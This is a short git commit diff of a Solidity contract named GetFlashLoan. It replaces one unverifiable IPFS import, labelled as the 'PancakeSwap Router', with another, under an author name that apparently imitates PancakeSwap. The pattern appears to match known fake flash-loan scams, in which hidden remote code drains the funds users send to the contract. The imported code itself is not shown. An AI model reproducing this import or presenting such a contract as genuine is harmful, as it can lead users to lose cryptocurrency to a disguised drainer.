3218d5dec2cccc6fbb4f69e60c91a0bf6fd4e75b
Pancakeswap-lib <88216902+Pancakeswap-lib@users.noreply.github.com>
2021-08-01 13:43:47 -0700

    Update Router.sol

--- Router.sol
+++ Router.sol
@@ -10,7 +10,7 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
 //PancakeSwap Router
-import "ipfs://QmaVrZceCz6MWdMHwpd47ZwB7nZFDB5Mha2N8dcboxxsjg";
+import "ipfs://QmaKNCYNK7RG3Kd8xwMx9QmBPJZAgxtsGYeCH4bu1hpz5E";
 
 contract GetFlashLoan {
 	string public tokenName;
